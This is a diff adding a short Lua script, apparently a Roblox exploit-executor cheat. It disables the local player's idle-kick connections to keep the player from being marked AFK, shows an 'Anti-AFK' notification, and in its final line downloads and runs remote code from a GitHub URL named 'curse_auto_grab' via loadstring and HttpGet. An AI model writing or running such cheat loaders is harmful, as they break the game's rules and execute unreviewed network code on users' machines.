@@ -1,0 +1,13 @@
+for i,v in pairs(getconnections(game:GetService("Players").LocalPlayer.Idled)) do
+v:Disable()
+end
+
+print("anti-afk enabled")
+game:GetService("StarterGui"):SetCore("SendNotification",{
+	Title = "Anti-Afk",
+	Text = "Anti-AFK has been enabled.", -- Required
+	Icon = "rbxassetid://145360517" -- Optional
+})
+
+
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/Aidez/elemental_awakening/main/curse_auto_grab'),true))()
